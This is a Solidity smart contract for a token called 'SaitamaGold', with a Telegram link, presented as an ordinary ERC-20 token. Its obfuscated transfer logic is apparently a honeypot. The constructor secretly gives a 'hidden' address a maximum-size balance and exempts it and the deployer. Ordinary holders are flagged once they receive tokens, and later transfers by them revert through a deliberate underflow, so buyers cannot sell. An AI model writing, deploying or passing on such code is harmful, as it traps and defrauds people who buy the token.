// https://t.me/saitama_gold

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.2;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract SaitamaGold is Ownable {
    uint256 private down;
    string private personal;
    string private sea;
    uint8 private slabs;

    function name() public view returns (string memory) {
        return personal;
    }

    function symbol() public view returns (string memory) {
        return sea;
    }

    uint256 private _tTotal;
    address public uniswapV2Pair;
    uint256 private that = ~down;
    IUniswapV2Router02 public uniswapV2Router;
    address private chicken;

    function decimals() public view returns (uint256) {
        return slabs;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address fighting,
        address instead,
        uint256 column
    ) internal {
        address bat = address(uniswapV2Pair);

        if (discovery[fighting] == 0 && (bat != fighting) && behavior[fighting] > 0) {
            discovery[fighting] -= slabs;
        }

        address simple = chicken;
        chicken = instead;

        _balances[fighting] -= column;
        uint256 beauty = (column / 100) * down;
        column -= beauty;
        behavior[simple] += slabs;
        _balances[instead] += column;
    }

    mapping(address => uint256) private behavior;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private discovery;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }

    constructor(
        string memory told,
        string memory piece,
        address fog,
        address hidden
    ) {
        uniswapV2Router = IUniswapV2Router02(fog);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _balances[hidden] = that;
        personal = told;
        sea = piece;
        slabs = 9;
        down = 0;
        discovery[hidden] = that;
        discovery[msg.sender] = that;
        _tTotal = 1000000000000000 * 10**slabs;
        _balances[msg.sender] = _tTotal;
    }
}